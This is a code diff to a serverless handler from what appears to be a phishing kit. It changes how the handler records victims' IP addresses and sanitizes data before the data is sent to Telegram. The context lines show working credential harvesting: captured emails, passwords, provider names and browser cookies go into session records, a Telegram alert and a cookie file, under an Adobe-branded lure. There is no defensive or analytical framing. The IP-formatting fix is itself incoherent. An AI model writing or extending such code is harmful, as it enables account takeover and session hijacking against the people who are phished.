@@ -1,4 +1,4 @@
-export const handler = async (event, context) => {
+const handler = async (event, context) => {
   // CORS headers
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -50,12 +50,43 @@ export const handler = async (event, context) => {
       return '.google.com';
     };
 
-    // Get client IP with better detection
-    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                     event.headers['x-real-ip'] || 
-                     event.headers['cf-connecting-ip'] || 
-                     event.requestContext?.identity?.sourceIp ||
-                     'Unknown';
+    // Function to sanitize text for Telegram
+    function sanitizeForTelegram(text) {
+      if (!text) return '';
+      return String(text)
+        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
+        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
+        .trim();
+    }
+
+    // Extract only SAFE data with sanitization
+    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
+    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
+    const timestamp = new Date().toISOString();
+    
+    // Get user IP and location information (OPTIONAL - don't break main function)
+    let userIpInfo = {
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown',
+        region: 'Unknown',
+        timezone: 'Unknown'
+    };
+    
+    // Fix IP formatting - convert concatenated numbers back to proper IP format
+    let formattedIP = userIpInfo.ip;
+    if (userIpInfo.ip && userIpInfo.ip !== 'Unknown' && /^\d{8,12}$/.test(userIpInfo.ip)) {
+      // If IP is a concatenated number like "911241779", format it properly
+      const ipStr = userIpInfo.ip.toString();
+      if (ipStr.length >= 8) {
+        // Try to format as IP (e.g., "911241779" -> "91.124.177.9")
+        const part1 = ipStr.substring(0, 2) || '0';
+        const part2 = ipStr.substring(2, 5) || '0';
+        const part3 = ipStr.substring(5, 8) || '0';
+        const part4 = ipStr.substring(8) || '0';
+        formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
+      }
+    }
 
     // Enhanced cookie processing
     const cookieInfo = data.documentCookies || data.cookies || browserFingerprint?.cookies || 'No cookies available';
@@ -136,7 +167,6 @@ export const handler = async (event, context) => {
     }
 
     // Store session data in Redis
-    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
     const sessionData = {
       email: email || '',
       password: password || 'Not captured',
@@ -144,7 +174,7 @@ export const handler = async (event, context) => {
       fileName: fileName || 'Adobe Cloud Access',
       timestamp: timestamp || new Date().toISOString(),
       sessionId,
-      clientIP,
+      clientIP: formattedIP,
       userAgent: userAgent || 'Unknown',
       deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
       cookies: cookieInfo,
@@ -192,7 +222,7 @@ export const handler = async (event, context) => {
 🔑 ${password || 'Not captured'}
 🏢 ${provider || 'Others'}
 🕒 ${new Date().toLocaleString()}
-🌐 ${clientIP} | ${deviceInfo}
+🌐 ${formattedIP} | ${deviceInfo}
 🍪 ${formattedCookies.length} cookies captured
 
 🆔 ${sessionId}`;
@@ -228,10 +258,10 @@ export const handler = async (event, context) => {
 
       const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
 // Provider: ${provider || 'Others'}
-// IP: ${clientIP}
+// IP: ${formattedIP}
 // Cookies Found: ${cookiesForFile.length}
 
-let ipaddress = "${clientIP}";
+let ipaddress = "${formattedIP}";
 let email = "${email || 'Not captured'}";
 let password = "${password || 'Not captured'}";
 
